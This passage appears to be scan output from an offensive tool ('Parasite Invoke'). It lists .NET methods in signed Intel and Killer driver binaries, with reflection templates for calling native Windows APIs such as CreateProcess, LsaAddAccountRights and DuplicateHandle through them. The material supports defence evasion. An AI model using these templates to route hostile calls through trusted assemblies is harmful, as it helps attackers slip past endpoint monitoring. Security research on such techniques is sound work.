        IntelAudioService.ControlModuleWrapper.Ioctl.IntelIOCTLSafeHandle result = (IntelAudioService.ControlModuleWrapper.Ioctl.IntelIOCTLSafeHandle) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: CreateHpalIOCTLControlInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""CreateHpalIOCTLControlInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.ControlModuleWrapper.Ioctl.IntelIOCTLSafeHandle result = (IntelAudioService.ControlModuleWrapper.Ioctl.IntelIOCTLSafeHandle) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: DisposeIOCTLControl
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""DisposeIOCTLControl"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr _ioctlHandle });
        ===END SIGNATURE===

Method: GetTinyParameter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""GetTinyParameter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntelIOCTLSafeHandle _ioctlHandle, uint _feature, uint _parameterId, UInt32& _parameterData });
        ===END SIGNATURE===

Method: SetTinyParameter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""SetTinyParameter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntelIOCTLSafeHandle _ioctlHandle, uint _feature, uint _parameterId, uint _parameterData, bool _setAsDefault });
        ===END SIGNATURE===

Method: GetBigParameter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""GetBigParameter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntelIOCTLSafeHandle _ioctlHandle, uint _feature, uint _parameterId, IntPtr& _dataBlob, UInt64& _dataBlobSize });
        ===END SIGNATURE===

Method: SetBigParameter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""SetBigParameter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntelIOCTLSafeHandle _ioctlHandle, uint _feature, uint _parameterId, IntPtr _dataBlob, ulong _dataBlobSize });
        ===END SIGNATURE===

Method: GetStructParameter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""GetStructParameter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntelIOCTLSafeHandle _ioctlHandle, uint _ioctlCode, uint _featureId, IntPtr& _data, uint _dataSize });
        ===END SIGNATURE===

Method: GetDevicePath
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""GetDevicePath"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelIOCTLSafeHandle _ioctlHandle, IntPtr& _devName });
        ===END SIGNATURE===

Method: GetProcessWorkingSetSizeExExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.Win32NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetProcessWorkingSetSizeExExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr _hProcess, Int32& _minWorkingSetSize, Int32& _maxWorkingSetSize, QUOTA_LIMITS_HARDWS& Flags });
        ===END SIGNATURE===

Method: SetProcessWorkingSetSizeExExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.Win32NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetProcessWorkingSetSizeExExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr _hProcess, int _minWorkingSetSize, int _maxWorkingSetSize, QUOTA_LIMITS_HARDWS Flags });
        ===END SIGNATURE===

Method: DuplicateHandleExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.Win32NativeMethods"", true);
        var methodInfo = t.GetMethod(""DuplicateHandleExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { uint _callerPid, IntPtr _wupEvent });
        ===END SIGNATURE===

Method: CloseHandleExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.Win32NativeMethods"", true);
        var methodInfo = t.GetMethod(""CloseHandleExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hObject });
        ===END SIGNATURE===

Method: CallNtPowerInformationExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""CallNtPowerInformationExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { int InformationLevel, IntPtr lpInputBuffer, int nInputBufferSize, SYSTEM_POWER_CAPABILITIES& spi, int nOutputBufferSize });
        ===END SIGNATURE===

Method: RegisterServiceCtrlHandlerExWExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterServiceCtrlHandlerExWExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpServiceName, ServiceControlHandlerEx cbex, IntPtr context });
        ===END SIGNATURE===

Method: RegisterPowerSettingNotificationExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterPowerSettingNotificationExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hRecipient, Guid& PowerSettingGuid, int Flags });
        ===END SIGNATURE===

Method: UnregisterPowerSettingNotificationExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""UnregisterPowerSettingNotificationExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle });
        ===END SIGNATURE===

Method: AdjustSecurityPrivileges
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""AdjustSecurityPrivileges"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: IsApiSetImplementedExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""IsApiSetImplementedExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { string _apiSetName });
        ===END SIGNATURE===

Method: IsPowerManagmentApiSetImplementedExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""IsPowerManagmentApiSetImplementedExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: CreateAcaDetectorDllClientInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""CreateAcaDetectorDllClientInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllSafeHandle result = (IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllSafeHandle) methodInfo.Invoke(null, new object[] { string _acaDetectorDllPath });
        ===END SIGNATURE===

Method: DisposeAcaDetectorDllClient
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""DisposeAcaDetectorDllClient"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr _acaDetectorDllHandle });
        ===END SIGNATURE===

Method: ACADetectorGetCaps
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""ACADetectorGetCaps"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaDetectorDllSafeHandle _acaDllHandle, string _acaIpPath, IntPtr _acaIpSoundsList });
        ===END SIGNATURE===

Method: ACADetectorBuildArmingData
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""ACADetectorBuildArmingData"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaDetectorDllSafeHandle _acaDllHandle, Guid _moduleId, IntPtr _acaList, IntPtr _acaConfList });
        ===END SIGNATURE===

Method: ACADetectorVerifyDetection
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""ACADetectorVerifyDetection"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaDetectorDllSafeHandle _acaDllHandle, Guid _moduleId, uint _inputBufSize, IntPtr _buf, UInt64& _startPcValue, UInt64& _endPcValue, IntPtr _acaDetection });
        ===END SIGNATURE===

Method: GetAcaDetectorApiVersion
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""GetAcaDetectorApiVersion"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { AcaDetectorDllSafeHandle _acaDllHandle, UInt32& _major, UInt32& _minor });
        ===END SIGNATURE===

Method: GetLibraryVersion
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""GetLibraryVersion"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { AcaDetectorDllSafeHandle _acaDllHandle, UInt32& _major, UInt32& _minor, UInt32& _build, UInt32& _revision });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, IntPtr lpInfo });
        ===END SIGNATURE===

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, SERVICE_FAILURE_ACTIONS& sfa });
        ===END SIGNATURE===

Method: OpenSCManager
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenSCManager"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string machineName, string databaseName, uint dwAccess });
        ===END SIGNATURE===

Method: OpenService
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenService"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess });
        ===END SIGNATURE===

Method: CloseServiceHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""CloseServiceHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hSCObject });
        ===END SIGNATURE===

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hServiceStatus, SERVICE_STATUS& lpServiceStatus });
        ===END SIGNATURE===

Method: LsaOpenPolicy
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaOpenPolicy"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { LSA_UNICODE_STRING& SystemName, LSA_OBJECT_ATTRIBUTES& ObjectAttributes, int DesiredAccess, IntPtr& PolicyHandle });
        ===END SIGNATURE===

Method: LsaAddAccountRights
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaAddAccountRights"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr PolicyHandle, IntPtr AccountSid, LSA_UNICODE_STRING[] UserRights, uint CountOfRights });
        ===END SIGNATURE===

Method: FreeSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""FreeSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LookupAccountName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LookupAccountName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpSystemName, string lpAccountName, IntPtr psid, Int32& cbsid, StringBuilder domainName, Int32& cbdomainLength, Int32& use });
        ===END SIGNATURE===

Method: IsValidSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""IsValidSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LsaClose
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaClose"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr ObjectHandle });
        ===END SIGNATURE===

Method: LsaNtStatusToWinError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaNtStatusToWinError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { uint status });
        ===END SIGNATURE===

Method: SetStdHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""SetStdHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { int device, IntPtr handle });
        ===END SIGNATURE===

Method: CreateProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""CreateProcess"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO& lpStartupInfo, PROCESS_INFORMATION& lpProcessInformation });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: AttachConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""AttachConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { uint dwProcessId });
        ===END SIGNATURE===

Method: FreeConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FreeConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetConsoleCtrlHandler
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""SetConsoleCtrlHandler"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { ConsoleCtrlDelegate HandlerRoutine, bool Add });
        ===END SIGNATURE===

Method: GenerateConsoleCtrlEvent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""GenerateConsoleCtrlEvent"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { CtrlTypes dwCtrlEvent, uint dwProcessGroupId });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KillerLU.exe

Method: FreeConsole
        ===PARASITE INVOKE SIGNATURE===
